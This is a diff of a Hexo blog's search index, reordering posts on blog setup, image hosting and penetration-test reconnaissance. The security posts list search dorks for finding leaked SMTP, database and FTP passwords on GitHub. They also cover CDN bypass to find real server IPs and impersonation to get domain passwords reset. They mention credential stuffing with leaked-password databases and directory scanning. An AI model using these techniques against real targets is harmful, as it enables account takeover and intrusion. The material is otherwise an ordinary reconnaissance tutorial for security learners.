@@ -1,125 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>利用github搭建hexo博客</title>
-    <url>/2023/07/27/%E5%88%A9%E7%94%A8github%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/</url>
-    <content><![CDATA[<p>本文介绍如何使用GitHub + Hexo搭建个人博客网站，完全免费，所有内容本人亲测，绝对可用。</p>
-<span id="more"></span>
-
-<h2 id="准备前提"><a href="#准备前提" class="headerlink" title="准备前提"></a>准备前提</h2><ol>
-<li>提前安装好<a href="https://nodejs.org/en">node.js</a>左边的那个</li>
-<li>提前安装好<a href="https://git-scm.com/downloads">GIt</a></li>
-<li>提前注册好一个<a href="https://github.com/">github</a>账号（ps:挂代理）</li>
-<li>如果文章图片没有显示，请自行挂代理</li>
-</ol>
-<h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><ol>
-<li>在本地找个目录放博客源文件，路径不要有中文(例：D:\hexo\blog)</li>
-<li>在选定的目录中，右键Git Bash Here</li>
-<li>使用npm命令安装Hexo，输入：</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli #该命令执行不成功可以查看一下博客目录是不是只读，或者重新创建文件夹。</span><br><span class="line">hexo init blog</span><br><span class="line">cd blog</span><br><span class="line">hexo g </span><br></pre></td></tr></table></figure>
-
-<p>构建好的效果:</p>
-<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230727130841778.png" alt="image-20230727130841778"></p>
-<ol start="4">
-<li>cd进入这个目录<br>检测网站雏形，分别按顺序输入以下三条命令：</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new test_my_site</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br><span class="line">之后就可以访问127.0.0.1:4000访问blog了或者http://localhost:4000/ </span><br></pre></td></tr></table></figure>
-
-<ol start="5">
-<li>配置ssh</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ~/.ssh    //检查本机已存在的ssh密钥，如果是重新创建请删除用户目录下的.ssh文件夹</span><br><span class="line">//如果提示：No such file or directory 说明你是第一次使用git。</span><br><span class="line">ssh-keygen -t rsa -C “xxxxxxx@qq.com”  //或者其他邮箱</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到.ssh\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：</li>
-<li>key填写C:\Users\Administrator.ssh\id_rsa.pub中的内容（C盘用户目录下的管理员用户下的.shh目录下的id_rsa.pub中的内容用记事本打开复制里面的内容）</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230727131643490.png" alt="image-20230727131643490"></p>
-<ul>
-<li>尝试ssh连接,测试是否成功</li>
-</ul>
-<blockquote>
-<p>ssh -T <a href="mailto:&#103;&#x69;&#116;&#64;&#103;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#111;&#x6d;">&#103;&#x69;&#116;&#64;&#103;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#111;&#x6d;</a>   #注意邮箱地址不用改</p>
-</blockquote>
-<ul>
-<li>提示Are you sure you want to continue connecting (yes&#x2F;no)?，输入yes，然后会看到下面这个，就算成功：</li>
-</ul>
-<blockquote>
-<p>Hi （你的用户名）! You’ve successfully authenticated, but GitHub does not provide shell access.</p>
-</blockquote>
-<ul>
-<li>在<strong>blog</strong>目录下打开以<strong>管理员身份cmd</strong></li>
-</ul>
-<blockquote>
-<p>npm install hexo-deployer-git –save</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230727132640132.png" alt="image-20230727132640132"></p>
-<ul>
-<li>返回Git Bash Here继续配置</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.name “luozhixiaowo”  // 你的github用户名，非昵称</span><br><span class="line">git config --global user.email “xxx@qq.com“  // 填写你的github注册邮箱</span><br></pre></td></tr></table></figure>
-
-<ol start="6">
-<li>准备上传代码</li>
-</ol>
-<ul>
-<li><p>在github上新建一个存储库，命名为（github的用户名.github.io）</p>
-<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230727133023861.png" alt="image-20230727133023861"></p>
-<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230727133320089.png" alt="image-20230727133320089"></p>
-</li>
-<li><p>点击创建</p>
-<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230727133447955.png" alt="image-20230727133447955"></p>
-</li>
-<li><p>编辑_config.yml（站点配置文件）文件，在最后改成这样</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">	type: git</span><br><span class="line">	repository: git@github.com:你的GitHub用户名/你的GitHub用户名.github.io.git</span><br><span class="line">	branch: main</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>注意保持格式，缩进不对，会导致一会儿，上传不成功 PS:建议直接Tab</p>
-</li>
-<li><p>最后上传</p>
-</li>
-</ul>
-<blockquote>
-<p>hexo d -g<br>每次上传成功之后，需要等待1-5分钟，用来刷新页面<br>PS:上传之前也可以hexo clean #清除缓存一下</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/202303271424650-1.png" alt="202303271424650-1"></p>
-<ul>
-<li>博客链接在创建的存储库的设置中-pages-如图设置</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230727134317395.png" alt="image-20230727134317395"></p>
-<ol start="7">
-<li>hexo命令介绍</li>
-</ol>
-<blockquote>
-<p>hexo n “我的博客” &#x3D;&#x3D; hexo new “我的博客” #新建文章<br>hexo new page “pageName” #新建页面<br>hexo g &#x3D;&#x3D; hexo generate #生成<br>hexo s &#x3D;&#x3D; hexo server #启动服务预览<br>hexo d &#x3D;&#x3D; hexo deploy #部署</p>
-<p>hexo server #Hexo会监视文件变动并自动更新，无须重启服务器<br>hexo server -s #静态模式<br>hexo server -p 5000 #更改端口<br>hexo server -i 192.168.1.1 #自定义 IP<br>hexo clean #清除缓存，若是网页正常情况下可以忽略这条命令<br>hexo version #查看Hexo的版本<br>hexo generate #生成静态页面至public目录</p>
-<p>hexo s -g #生成并本地预览<br>hexo d -g #生成并上传</p>
-</blockquote>
-<ol start="8">
-<li>hexo目录结构</li>
-</ol>
-<blockquote>
-<p>+– .deploy #hexo deploy生成的文件<br>+– node_modules #npm组件<br>+– public #生成的静态网页文件<br>+–scaffolds #模板<br>+– source #博客正文和其他源文件<br>| +– _posts #我们自己写的文章以md结尾<br>+– themes #主题<br>+– _config.yml #全局配置文件<br>– package.json #定义了hexo所需要的各种模块</p>
-</blockquote>
-<ol start="9">
-<li>选择一个自己喜欢的主题，不知道有什么好用的主题可以直接，B站搜HEXO主题</li>
-<li>这里我用的是Next主题<br>这里给几个主题配置教程可能有些老<br><a href="https://juejin.cn/post/7169115268944560135#heading-48">Hexo-Next主题搭建个人博客最新配置教程！</a><br><a href="https://juejin.cn/post/6844903696455696391?searchId=20230728110022C8105951329DA4924C3B">Hexo+NexT 打造一个炫酷博客</a><br><a href="https://www.bilibili.com/video/BV16W411t7mq/?p=14&spm_id_from=333.880.my_history.page.click">馨客栈分享</a></li>
-</ol>
-<hr>
-<p><em>转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 <a href="mailto:&#x31;&#57;&#x39;&#52;&#x36;&#x35;&#48;&#x30;&#56;&#54;&#x40;&#x71;&#113;&#46;&#99;&#x6f;&#109;">&#x31;&#57;&#x39;&#52;&#x36;&#x35;&#48;&#x30;&#56;&#54;&#x40;&#x71;&#113;&#46;&#99;&#x6f;&#109;</a></em> </p>
-]]></content>
-      <categories>
-        <category>博客搭建</category>
-      </categories>
-      <tags>
-        <tag>HEXO</tag>
-        <tag>blog</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>typora+PicGo图片上传</title>
     <url>/2023/07/27/typora+PicGo%E5%9B%BE%E7%89%87%E4%B8%8A%E4%BC%A0/</url>
     <content><![CDATA[<p>本文介绍了如何使用typora + PicGo上传图片到图床</p>
@@ -188,30 +69,6 @@
       <tags>
         <tag>HEXO</tag>
         <tag>img上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>信息收集之GitHub搜索语法</title>
-    <url>/2023/08/04/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BGitHub%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95/</url>
-    <content><![CDATA[<h2 id="信息收集之GitHub搜索语法"><a href="#信息收集之GitHub搜索语法" class="headerlink" title="信息收集之GitHub搜索语法"></a>信息收集之GitHub搜索语法</h2><span id="more"></span>
-
-<p>在渗透测试的信息收集阶段，可以去Github和码云上搜索与目标有关的信息，或者就有意想不到的收获。(有些开发人员将代码上传到代码库的时候，有可能连一些重要的配置信息也上传了)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">in:name test               #仓库标题搜索含有关键字test</span><br><span class="line">in:descripton test         #仓库描述搜索含有关键字</span><br><span class="line">in:readme test             #Readme文件搜素含有关键字</span><br><span class="line">stars:&gt;3000 test           #stars数量大于3000的搜索关键字</span><br><span class="line">stars:1000..3000 test      #stars数量大于1000小于3000的搜索关键字</span><br><span class="line">forks:&gt;1000 test           #forks数量大于1000的搜索关键字</span><br><span class="line">forks:1000..3000 test      #forks数量大于1000小于3000的搜索关键字</span><br><span class="line">size:&gt;=5000 test           #指定仓库大于5000k(5M)的搜索关键字</span><br><span class="line">pushed:&gt;2019-02-12 test    #发布时间大于2019-02-12的搜索关键字</span><br><span class="line">created:&gt;2019-02-12 test   #创建时间大于2019-02-12的搜索关键字</span><br><span class="line">user:test                  #用户名搜素</span><br><span class="line">license:apache-2.0 test    #明确仓库的 LICENSE 搜索关键字</span><br><span class="line">language:java test         #在java语言的代码中搜索关键字</span><br><span class="line">user:test in:name test     #组合搜索,用户名test的标题含有test的</span><br></pre></td></tr></table></figure>
-
-<h3 id="使用-Github-进行邮件配置信息收集"><a href="#使用-Github-进行邮件配置信息收集" class="headerlink" title="使用 Github 进行邮件配置信息收集"></a>使用 Github 进行邮件配置信息收集</h3><p>很多网站及系统都会使用 pop3 和 smtp 发送来邮件，不少开发者由于安全意识不足会把相关的配置信息也放到Github上，所以如果这时候我们动用一下google搜索命令语句，构造一下关键字，就能把这些信息给找出来了。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:Github.com smtp</span><br><span class="line">site:Github.com smtp @qq.com</span><br><span class="line">site:Github.com smtp @126.com</span><br><span class="line">site:Github.com smtp @163.com</span><br><span class="line">site:Github.com smtp @sina.com.cn</span><br><span class="line">site:Github.com smtp password</span><br><span class="line">site:Github.com String password smtp</span><br><span class="line">……</span><br><span class="line">我们也可以锁定域名搜索结合厂商域名 灵活运用例如搜百度的</span><br><span class="line">site:Github.com smtp @baidu.com</span><br></pre></td></tr></table></figure>
-
-<h3 id="使用Github进行数据库信息收集"><a href="#使用Github进行数据库信息收集" class="headerlink" title="使用Github进行数据库信息收集"></a>使用Github进行数据库信息收集</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:Github.com sa password</span><br><span class="line">site:Github.com root password</span><br><span class="line">site:Github.com User ID=’sa’;Password</span><br><span class="line">site:Github.com inurl:sql</span><br></pre></td></tr></table></figure>
-
-<h3 id="使用Github进行-SVN-信息收集"><a href="#使用Github进行-SVN-信息收集" class="headerlink" title="使用Github进行 SVN 信息收集"></a>使用Github进行 SVN 信息收集</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:Github.com svn</span><br><span class="line">site:Github.com svn username</span><br><span class="line">site:Github.com svn password</span><br><span class="line">site:Github.com svn username password </span><br></pre></td></tr></table></figure>
-
-<h3 id="使用Github进行综合信息收集"><a href="#使用Github进行综合信息收集" class="headerlink" title="使用Github进行综合信息收集"></a>使用Github进行综合信息收集</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:Github.com password</span><br><span class="line">site:Github.com ftp ftppassword</span><br><span class="line">site:Github.com 密码</span><br><span class="line">site:Github.com 内部</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>Wed安全</tag>
-        <tag>信息收集</tag>
       </tags>
   </entry>
   <entry>
@@ -438,6 +295,129 @@
       <tags>
         <tag>HEXO</tag>
         <tag>blog</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>信息收集</title>
+    <url>/2023/07/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
+    <content><![CDATA[<p>本文介绍如何进行信息收集</p>
+<span id="more"></span>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>信息收集是指通过各种方式获取所需要的信息，以便我们在后续的渗透过程更好的进行。最简单的比如说目标站点的IP、中间件、脚本语言、端口、邮箱等等。我觉得信息收集在渗透测试的过程当中，是最重要的一环，这一环节没做好，没收集到足够多的可利用的信息，很难进行下一步的操作。</p>
+<h2 id="信息收集的方法"><a href="#信息收集的方法" class="headerlink" title="信息收集的方法"></a>信息收集的方法</h2><h3 id="1-查企业信息"><a href="#1-查企业信息" class="headerlink" title="1. 查企业信息"></a>1. 查企业信息</h3><p>使用爱企查，天眼查，企查查，领英对域名所有者（一般是公司）进行查询<br>可以收集到：</p>
+<ol>
+<li>法人</li>
+<li>公司电话信息</li>
+<li>邮箱信息</li>
+<li>地址</li>
+<li>股东信息等等</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230729094747957.png" alt="image-20230729094747957"></p>
+<h3 id="2-whois信息"><a href="#2-whois信息" class="headerlink" title="2. whois信息"></a>2. whois信息</h3><p>如果要查询域名的IP、所有者等信息的传输协议，就可以用whois</p>
+<p><strong>whois信息可以获取关键注册人的信息，其中包括：</strong></p>
+<blockquote>
+<p>所有者<br>联系电话<br>所有者联系邮箱<br>注册商<br>域名注册时间<br>域名状态<br>域名到期时间<br>DNS服务器等。</p>
+</blockquote>
+<p><strong>可以对其进行</strong></p>
+<blockquote>
+<p>爆破邮箱<br>邮箱反查域名<br>域名劫持<br>社工<br>寻找旁站等</p>
+</blockquote>
+<p><strong>常用的工具有：</strong><br><a href="https://whois.chinaz.com/">域名Whois查询 - 站长之家</a><br><a href="https://whois.cloud.tencent.com/domain">域名信息查询 - 腾讯云</a><br><a href="https://whois.aliyun.com/">阿里云域名信息查询</a><br><a href="https://www.whois.com/whois/">域名信息查询</a></p>
+<h3 id="3-子域名"><a href="#3-子域名" class="headerlink" title="3. 子域名"></a>3. 子域名</h3><ul>
+<li><p>子域名是指二级域名，是一级域名（顶级域名）的下一级，收集的子域名越多，我们测试的目标就越多，渗透的成功率也越大。往往在主站找不到突破口的时候，我们从子域名入手。</p>
+</li>
+<li><p>有许多第三方服务聚合了大量的DNS数据集，可以通过它们来检索给定域名的子域名</p>
+</li>
+</ul>
+<p>（1）VirusTotal：<a href="https://www.virustotal.com/#/home/search">https://www.virustotal.com/#/home/search</a><br>（2）DNSdumpster：<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a> </p>
+<ul>
+<li>爆破枚举工具</li>
+</ul>
+<p>（1）layer子域名挖掘机<br>（2）subDomainsBrute</p>
+<ul>
+<li>IP段的收集<br>一般IP的话，我们在收集子域名的时候，就大概知道目标网站的IP段了。<br>也可以通过whois命令获取。即通过中国互联网信息中心<a href="https://ipwhois.cnnic.cn/index.jsp">https://ipwhois.cnnic.cn/index.jsp</a> 进行查询：</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230729151754688.png" alt="image-20230729151754688"></p>
+<ul>
+<li>Google语法</li>
+</ul>
+<p>可以利用Google和Bing这样的搜索引擎进行搜索查询（site:<a href="http://www.xxx.com)/">www.xxx.com）</a></p>
+<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230729151956889.png" alt="image-20230729151956889"></p>
+<h3 id="4-DNS"><a href="#4-DNS" class="headerlink" title="4. DNS"></a>4. DNS</h3><p>通过DNS解析找到IP地址,主要有以下几种方法:<br><strong>（1）ping</strong></p>
+<p><strong>（2）nslookup</strong></p>
+<p>NSLOOKUP是NT、2000中连接DNS服务器，查询域名信息的一个非常有用的命令，可以指定查询的类型，可以查到DNS记录的生存时间还可以指定使用哪个DNS服务器进行解析。在已安装TCP&#x2F;IP协议的电脑上面均可以使用这个命令。主要用来诊断域名系统 (DNS) 基础结构的信息。</p>
+<p>直接查询：<code>nslookup 域名</code></p>
+<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230731150528539.png" alt="image-20230731150528539"></p>
+<p>查询更具体的信息：<code>slookup -d 域名</code></p>
+<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230731151325344.png" alt="image-20230731151325344"></p>
+<p><strong>（3）dig工具</strong></p>
+<p><code>dig</code> 和 <code>nslookup</code> 之间差异不大，但 <code>dig</code> 更像一个加强版的 <code>nslookup</code>，可以查询到一些由域名服务器管理的信息，这在排查某些问题的时候非常有用。</p>
+<p><strong>（4）dnsenum工具</strong></p>
+<p>dnsenum会自动检测域传送漏洞<br>使用<code>dnsenum -h</code>来查询全部命令</p>
+<p><strong>（5）站长之家</strong></p>
+<p>站长之家官网首页(<a href="http://tool.chinaz.com/">http://tool.chinaz.com</a>)<br> 站长之家DNS查询(<a href="https://tool.chinaz.com/dns/">https://tool.chinaz.com/dns/</a>)</p>
+<p><strong>（6）CDN技术</strong></p>
+<p>很多时候，网站都会开启CDN加速，导致我们查询到的IP不是真实的IP，所以得先查询到真实的IP地址。</p>
+<ul>
+<li><p>可以全网爆破查询真实ip,返回结果有多个，说明启用了CND技术。</p>
+</li>
+<li><p>或者DNS的查询（<a href="https://www.dnsdb.io/zh-cn/search?q=www.aliyun.com%20type:MX">https://www.dnsdb.io/zh-cn/search?q=www.aliyun.com%20type:MX</a> ）</p>
+</li>
+<li><p>绕过CDN寻找真实IP的方法<br>（1）<strong>内部邮箱源：</strong>一般的邮件系统都在内部，没有经过CDN的解析，通过目标网站用户注册或者RSS订阅功能，查看邮件、寻找邮件头中的邮件服务器域名IP，ping 这个邮件服务器的域名， 就可以获得目标的真实IP （注意，必须是目标自己的邮件服务器，第三方或公共邮件服务器是没有用的）。</p>
+<p>（2）<strong>扫描网站测试文件</strong>，如phpinfo 、test 等，从而找到目标的真实IP 。</p>
+<p>（3）<strong>分站域名：</strong>很多网站主站的访问量会比较大，所以主站都是挂CDN 的，但是分站可能没有挂CDN，可以通过ping二级域名获取分站IP，可能会出现分站和主站不是同一个IP但在同一个C段下面的情况，从而能判断出目标的真实IP段。</p>
+<p>（4）<strong>国外访问：</strong>国内的CDN往往只对国内用户的访问加速，而国外的CDN就不一定了。因此，通过国外在线代理网站访问，可能会得到真实的IP。</p>
+<p>（5）<strong>查询历史域名的解析记录：</strong>也许目标很久以前并没有用过CDN，所以可以通过网站<a href="https://www.netcraft.com/">NETC RAFT</a>来观察域名的IP历史记录，也可以大致分析出目标的真实IP段。</p>
+<p>（6）<strong>如果目标网站有自己的App</strong>，可以尝试利用Fiddler或BurpSuite截取App的请求，从里面找到目标的真实IP。</p>
+</li>
+</ul>
+<h3 id="5-网络空间搜索引擎收集敏感信息"><a href="#5-网络空间搜索引擎收集敏感信息" class="headerlink" title="5. 网络空间搜索引擎收集敏感信息"></a>5. 网络空间搜索引擎收集敏感信息</h3><p>网络空间搜索引擎通过全网扫描的方式，将基础数据进行格式化存储，供安全人员按需搜索使用，提升了安全人员的工作效率。</p>
+<p>目前国内外的网络空间搜索引擎有 shodan、zoomeye、fofa</p>
+<h4 id="shodan"><a href="#shodan" class="headerlink" title="shodan"></a>shodan</h4><p><a href="https://www.shodan.io/">Shodan</a> 是目前最为知名的黑客搜索引擎。</p>
+<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230729153346539.png" alt="image-20230729153346539"></p>
+<p>简单语法：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">hostname：      # 搜索指定的主机或域名,例如 hostname:&quot;google&quot;</span><br><span class="line">port：          # 搜索指定的端口或服务,例如 port:&quot;21&quot;</span><br><span class="line">country：       # 搜索指定的国家,例如 country:&quot;CN&quot;</span><br><span class="line">city：          # 搜索指定的城市,例如 city:&quot;hunan&quot;</span><br><span class="line">org：           # 搜索指定的组织或公司,例如 org:&quot;google&quot;</span><br><span class="line">isp：           # 搜索指定的ISP供应商,例如 isp:&quot;China Telecom&quot;</span><br><span class="line">product：       # 搜索指定的操作系统/软件/平台,例如 product:&quot;Apache httpd&quot;</span><br><span class="line">version：       # 搜索指定的软件版本,例如 version:&quot;1.6.2&quot;</span><br><span class="line">geo：           # 搜索指定的地理位置,参数为经纬度,例如 geo:&quot;31.8639, 117.2808&quot;</span><br><span class="line">before/after：  # 搜索指定收录时间前后的数据,格式为dd-mm-yy,例如 before:&quot;11-11-15&quot;</span><br><span class="line">net：           # 搜索指定的IP地址或子网,例如 net:&quot;210.45.240.0/24&quot;a</span><br></pre></td></tr></table></figure>
+
+<h4 id="ZoomEye"><a href="#ZoomEye" class="headerlink" title="ZoomEye"></a>ZoomEye</h4><p><a href="https://www.zoomeye.org/">ZoomEye</a> 是北京知道创宇公司发布的网络空间侦测引擎</p>
+<p>&#x27A4;ZoomEye 支持公网设备指纹检索和 Web 指纹检索。网站指纹包括应用名、版本、前端框架、后端框架、服务端语言、服务器操作系统、网站容器、内容管理系统和数据库等。设备指纹包括应用名、版本、开放端口、操作系统、服务名、地理位置等。</p>
+<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230729154002739.png" alt="image-20230729154002739"></p>
+<p>简单语法：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">app:nginx           # 组件名</span><br><span class="line">ver:1.0             # 版本</span><br><span class="line">os:windows          # 操作系统</span><br><span class="line">country:&quot;China&quot;     # 国家</span><br><span class="line">city:&quot;hunan&quot;        # 城市</span><br><span class="line">port:80             # 端口</span><br><span class="line">hostname:google     # 主机名</span><br><span class="line">site:google.com     # 网站域名</span><br><span class="line">desc:nmask          # 描述</span><br><span class="line">keywords:passwd     # 关键词</span><br><span class="line">service:ftp         # 服务类型</span><br><span class="line">ip:8.8.8.8          # ip地址</span><br><span class="line">cidr:8.8.8.8/24     # ip地址段</span><br></pre></td></tr></table></figure>
+
+<h4 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h4><p><a href="https://fofa.info/">FOFA</a> 是白帽汇推出的一款网络空间搜索引擎，它通过进行网络空间测绘，能够帮助研究人员或者企业迅速进行网络资产匹配，例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等。</p>
+<p>简单语法：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">title=&quot;abc&quot;        # 从标题中搜索abc。例：标题中有北京的网站。</span><br><span class="line">header=&quot;abc&quot;       # 从http头中搜索abc。例：jboss服务器。</span><br><span class="line">body=&quot;abc&quot;         # 从html正文中搜索abc。例：正文包含Hacked by。</span><br><span class="line">domain=&quot;qq.com&quot;    # 搜索根域名带有qq.com的网站。例： 根域名是qq.com的网站。</span><br><span class="line">host=&quot;.gov.cn&quot;     # 从url中搜索.gov.cn,注意搜索要用host作为名称。</span><br><span class="line">port=&quot;443&quot;         # 查找对应443端口的资产。例： 查找对应443端口的资产。</span><br><span class="line">ip=&quot;1.1.1.1&quot;       # 从ip中搜索包含1.1.1.1的网站,注意搜索要用ip作为名称。</span><br><span class="line">protocol=&quot;https&quot;   # 搜索制定协议类型(在开启端口扫描的情况下有效)。例： 查询https协议资产。</span><br><span class="line">city=&quot;Beijing&quot;     # 搜索指定城市的资产。例： 搜索指定城市的资产。</span><br><span class="line">region=&quot;Zhejiang&quot;  # 搜索指定行政区的资产。例： 搜索指定行政区的资产。</span><br><span class="line">country=&quot;CN&quot;       # 搜索指定国家(编码)的资产。例： 搜索指定国家(编码)的资产。</span><br><span class="line">cert=&quot;google.com&quot;  # 搜索证书(https或者imaps等)中带有google.com的资产。</span><br></pre></td></tr></table></figure>
+
+<p>每个平台都有自己的特点和优势，我们可以使用多个平台来补充自己的结果，让搜索的信息更全。</p>
+<h3 id="6-网站信息收集—指纹信息"><a href="#6-网站信息收集—指纹信息" class="headerlink" title="6. 网站信息收集—指纹信息"></a>6. 网站信息收集—指纹信息</h3><p><strong>CMS及Web指纹识别的必要性</strong></p>
+<p><strong>必要性</strong>：在渗透测试中，只有识别出相应的Web容器或者CMS ，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。</p>
+<p><strong>CMS：</strong>内容管理系统是一种位于WEB前端（Web 服务器）和后端办公系统或流程（内容创作、编辑）之间的软件系统。内容的创作人员、编辑人员、发布人员使用内容管理系统来提交、修改、审批、发布内容。</p>
+<ul>
+<li><strong>云悉指纹：</strong><a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></li>
+<li><strong>36OFinger-P：</strong><a href="https://fp.shuziguanxing.com/#/">https://fp.shuziguanxing.com/#/</a></li>
+<li><strong>潮汐指纹：</strong><a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></li>
+</ul>
+<h3 id="7-社会工程学"><a href="#7-社会工程学" class="headerlink" title="7. 社会工程学"></a>7. 社会工程学</h3><p>（1）社会工程学在渗透测试中起着不小的作用，利用社会工程学，攻击者可以从一名员工的口中挖掘出本应该是秘密的信息。</p>
+<p>（2）假设攻击者对一家公司进行渗透测试，正在收集目标的真实IP阶段，此时就可以利用收集到的这家公司的某位销售人员的电子邮箱。首先，给这位销售人员发送邮件，假装对某个产品很感兴趣，显然销售人员会回复邮件。这样攻击者就可以通过分析邮件头来收集这家公司的真实IP地址及内部电子邮件服务器的相关信息。</p>
+<p>（3）通过进一步地应用社会工程学，假设现在己经收集了目标人物的邮箱、QQ 、电话号码、姓名，以及域名服务商， 也通过爆破或者撞库的方法获取邮箱的密码，这时就可以冒充目标人物要求客服人员协助重置域管理密码，甚至技术人员会帮着重置密码，从而使攻击者拿下域管理控制台，然后做域劫持。</p>
+<p>（4）除此以外，还可以利用“社工库”查询想要得到的信息，社工库是用社会工程学进行攻击时积累的各方数据的结构化数据库。这个数据库里有大量信息，甚至可以找到每个人的各种行为记录。利用收集到的邮箱，可以在社工库中找到己经泄露的密码，其实还可以通过搜索引擎搜索到社交账号等信息，然后通过利用社交和社会工程学得到的信息构造密码字典，对目标用户的邮箱和OA账号进行爆破或者撞库。</p>
+<h3 id="8-敏感目录"><a href="#8-敏感目录" class="headerlink" title="8. 敏感目录"></a>8. 敏感目录</h3><p>敏感目录扫描能够得到其他网页的很多信息，找到后台管理页面，尝试进入后台，然后提升权限等<br>扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄露<br>工具</p>
+<blockquote>
+<p>常用工具：御剑，小米范WEB目录扫描器，dirb，dirsearch</p>
+</blockquote>
+<h4 id="小米范WEB目录扫描器"><a href="#小米范WEB目录扫描器" class="headerlink" title="小米范WEB目录扫描器"></a>小米范WEB目录扫描器</h4><p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230804102827534.png" alt="image-20230804102827534"></p>
+<h4 id="御剑"><a href="#御剑" class="headerlink" title="御剑"></a>御剑</h4><p>御剑后台扫描工具</p>
+<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230804102613159.png" alt="image-20230804102613159"></p>
+<h4 id="dirb"><a href="#dirb" class="headerlink" title="dirb"></a>dirb</h4><p>Kali Linux内置工具<br>dirb是一个基于字典的web目录扫描工具,会用递归的方式来获取更多的目录,它还支持代理和http认证限制访问的网站</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb https:www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<h4 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h4><p>dirsearch是一个python开发的目录扫描工具,目的是扫描网站的敏感文件和目录从而找到突破口。<br>项目地址：<a href="https://github.com/maurosoria/dirsearch/">https://github.com/maurosoria/dirsearch/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://www.baidu.com</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>Wed安全</tag>
+        <tag>信息收集</tag>
       </tags>
   </entry>
   <entry>
@@ -771,126 +751,868 @@
       </tags>
   </entry>
   <entry>
-    <title>信息收集</title>
-    <url>/2023/07/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
-    <content><![CDATA[<p>本文介绍如何进行信息收集</p>
+    <title>利用github搭建hexo博客</title>
+    <url>/2023/07/27/%E5%88%A9%E7%94%A8github%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/</url>
+    <content><![CDATA[<p>本文介绍如何使用GitHub + Hexo搭建个人博客网站，完全免费，所有内容本人亲测，绝对可用。</p>
 <span id="more"></span>
